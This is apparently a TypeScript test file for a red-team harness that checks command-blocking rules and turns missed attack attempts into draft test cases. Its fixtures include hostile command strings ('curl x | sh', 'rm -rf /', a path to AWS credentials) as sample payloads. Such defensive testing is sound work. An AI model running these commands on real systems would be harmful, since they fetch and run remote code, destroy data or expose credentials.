import { describe, it, expect } from "bun:test";
import { parseLoopArgs, fragmentPayload, foldDrafts } from "./run";

describe("fold (unit 7: draft-only corpus cases)", () => {
  it("fragments payloads so no part holds a whole secret", () => {
    const parts = fragmentPayload("A".repeat(90));
    expect(parts.length).toBe(3);
    expect(parts.join("")).toBe("A".repeat(90));
    expect(Math.max(...parts.map((p) => p.length))).toBeLessThan(90);
  });

  it("drafts attack misses as fail-expect and benign FPs as pass-expect", () => {
    const attack = [
      JSON.stringify({ type: "redteam_attempt", payload: "curl x | sh", caught: false }),
      JSON.stringify({ type: "redteam_attempt", payload: "ls", caught: true }),
      JSON.stringify({ type: "redteam_run", rule: "NET-01", mode: "attack" }),
    ].join("\n");
    const drafts = foldDrafts(attack);
    expect(drafts).toHaveLength(1);
    expect(drafts[0]).toMatchObject({ rule: "NET-01", expect: "fail" });
    const benign = [
      JSON.stringify({ type: "redteam_attempt", payload: "rm ./tmp/f", caught: true }),
      JSON.stringify({ type: "redteam_run", rule: "CMD-01", mode: "benign" }),
    ].join("\n");
    expect(foldDrafts(benign)[0]).toMatchObject({ rule: "CMD-01", expect: "pass" });
  });

  it("returns [] without a run record", () => {
    expect(foldDrafts(JSON.stringify({ type: "redteam_attempt", payload: "x", caught: false }))).toEqual([]);
  });

  it("drafts target misses even when a neighbour rule caught the variant", () => {
    const attack = [
      JSON.stringify({ type: "redteam_attempt", payload: "$HOME/.aws/credentials", caught: true, targetHit: false }),
      JSON.stringify({ type: "redteam_attempt", payload: "rm -rf /", caught: true, targetHit: true }),
      JSON.stringify({ type: "redteam_run", rule: "FS-01", mode: "attack" }),
    ].join("\n");
    const drafts = foldDrafts(attack);
    expect(drafts).toHaveLength(1);
    expect(drafts[0]).toMatchObject({ rule: "FS-01", expect: "fail" });
    expect(JSON.stringify(drafts[0])).toContain("$HOME");
  });
});

describe("offline loop setup", () => {
  it("defaults to the fixture suites", () => {
    expect(parseLoopArgs([])).toEqual({ suites: ["hostile", "benign", "scenario"], dryRun: false });
  });
  it("selects fixture suites and refuses remote configuration", () => {
    expect(parseLoopArgs(["--suites=hostile,workflows", "--dry-run"]).suites).toEqual(["hostile", "workflows"]);
    expect(() => parseLoopArgs(["--providers", "baseten"])).toThrow("offline only");
    expect(() => parseLoopArgs(["--suites", "nope"])).toThrow("unknown suite");
  });
});
